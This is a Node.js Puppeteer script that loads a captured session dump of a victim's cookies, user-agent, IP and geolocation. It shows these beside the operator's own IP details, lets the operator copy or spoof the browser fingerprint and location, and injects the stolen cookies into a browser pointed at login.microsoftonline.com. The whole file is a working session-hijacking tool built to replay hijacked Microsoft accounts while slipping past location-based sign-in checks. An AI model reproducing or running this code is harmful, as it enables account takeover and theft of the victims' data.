const puppeteer = require('puppeteer');
const fs = require('fs');
const readline = require('readline');
const https = require('https');

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

// Helper to ask a question
const ask = (query) => new Promise(resolve => rl.question(query, resolve));

// Helper to get current IP and Geo Info
async function getCurrentIPInfo() {
  return new Promise((resolve, reject) => {
    https.get('https://ipinfo.io/json', (resp) => {
      let data = '';
      resp.on('data', (chunk) => { data += chunk; });
      resp.on('end', () => { resolve(JSON.parse(data)); });
    }).on('error', (err) => { reject(err); });
  });
}

(async () => {
  const sessionData = JSON.parse(fs.readFileSync('./session_dump.json', 'utf8'));

  // Show original session info
  console.log('\n--- Original Captured Session ---');
  console.log(`User-Agent: ${sessionData.userAgent}`);
  console.log(`IP Address: ${sessionData.ip}`);
  console.log(`City: ${sessionData.city}`);
  console.log(`Region/State: ${sessionData.region}`);
  console.log(`Country: ${sessionData.country}`);
  console.log(`Latitude: ${sessionData.coordinates?.latitude}`);
  console.log(`Longitude: ${sessionData.coordinates?.longitude}`);
  console.log(`Language: ${sessionData.language || 'Not Set'}`);

  // Fetch and show current session info
  const currentInfo = await getCurrentIPInfo();
  console.log('\n--- Your Current Info ---');
  console.log(`IP Address: ${currentInfo.ip}`);
  console.log(`City: ${currentInfo.city}`);
  console.log(`Region/State: ${currentInfo.region}`);
  console.log(`Country: ${currentInfo.country}`);
  console.log(`Location (lat,long): ${currentInfo.loc}`);

  // Ask the user
  console.log('\nOptions:');
  console.log('1. Replay session exactly (original User-Agent, Language, Geo)');
  console.log('2. Modify User-Agent manually');
  console.log('3. Modify Geolocation manually');
  console.log('4. Modify Language manually');
  console.log('5. Modify User-Agent and Geolocation');
  console.log('6. Modify User-Agent and Language');
  console.log('7. Modify Geolocation and Language');
  console.log('8. Modify all three (User-Agent, Language, Geolocation)');
  console.log('9. Proceed without modifying anything');

  const choice = await ask('Select an option (1-9): ');

  let userAgent = sessionData.userAgent || '';
  let latitude = sessionData.coordinates?.latitude;
  let longitude = sessionData.coordinates?.longitude;
  let language = sessionData.language || 'en-US,en;q=0.9';

  if (['2', '5', '6', '8'].includes(choice)) {
    userAgent = await ask('Enter the User-Agent string you want to use: ');
  }

  if (['3', '5', '7', '8'].includes(choice)) {
    latitude = parseFloat(await ask('Enter the latitude: '));
    longitude = parseFloat(await ask('Enter the longitude: '));
  }

  if (['4', '6', '7', '8'].includes(choice)) {
    language = await ask('Enter the Accept-Language header you want to use (e.g., en-US,en;q=0.9): ');
  }

  rl.close();

  const browser = await puppeteer.launch({
    headless: false,
    args: ['--no-sandbox', '--incognito']
  });

  const pages = await browser.pages();
  const page = pages[0];

  await page.setUserAgent(userAgent || '');
  await page.setExtraHTTPHeaders({
    'Accept-Language': language
  });

  // Grant geolocation permission
  await browser.defaultBrowserContext().overridePermissions(
    "https://login.microsoftonline.com",
    ["geolocation"]
  );

  // Set geolocation
  if (latitude && longitude) {
    await page.setGeolocation({ latitude, longitude });
    console.log(`Geolocation set to lat: ${latitude}, lon: ${longitude}`);
  } else {
    console.log('No geolocation set.');
  }

  // Set cookies
  await page.setCookie(...sessionData.cookies);

  // Navigate to the login page
  await page.goto('https://login.microsoftonline.com');

  console.log("Replay session started in incognito window.");
})();
